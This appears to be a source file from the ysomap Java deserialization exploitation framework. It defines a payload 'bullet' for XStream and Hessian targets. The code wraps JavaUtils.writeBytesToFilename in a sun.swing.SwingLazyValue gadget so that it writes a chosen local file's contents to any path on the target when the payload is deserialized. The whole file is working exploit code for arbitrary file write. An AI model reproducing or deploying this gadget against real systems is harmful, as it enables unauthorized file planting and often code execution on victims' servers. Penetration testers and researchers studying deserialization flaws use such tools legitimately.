package ysomap.bullets.jdk;

import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.FileHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3p1g
 * @since 2022/3/19
 */
@Bullets
@Dependencies({"jdk"})
@Details("写文件")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class LazyValueWithFileWrite1Bullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "filepath", detail = "/tmp/test, 远程目标路径")
    public String filepath;

    @NotNull
    @Require(name = "localFile", detail = "/tmp/test，本地路径")
    public String localFile;

    public byte[] data = new byte[0];

    @Override
    public Object getObject() throws Exception {
        String classname = "com.sun.org.apache.xml.internal.security.utils.JavaUtils";
        String methodName = "writeBytesToFilename";

        if(!"dynamic".equals(localFile)){
            data = FileHelper.fileGetContent(localFile);
        }

        Object[] evilargs = new Object[]{filepath, data};
        try{
            return ReflectionHelper.newInstance(
                    "sun.swing.SwingLazyValue",
                    new Class[]{String.class, String.class, Object[].class},
                    classname, methodName, evilargs);
        }catch (Exception e){
            Logger.error("Create sun.swing.SwingLazyValue, plz check current jdk is <=8.");
            return null;
        }
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new LazyValueWithFileWrite1Bullet();
        bullet.set("filepath", args[0]);
        bullet.set("localFile", args[1]);
        return bullet;
    }
}
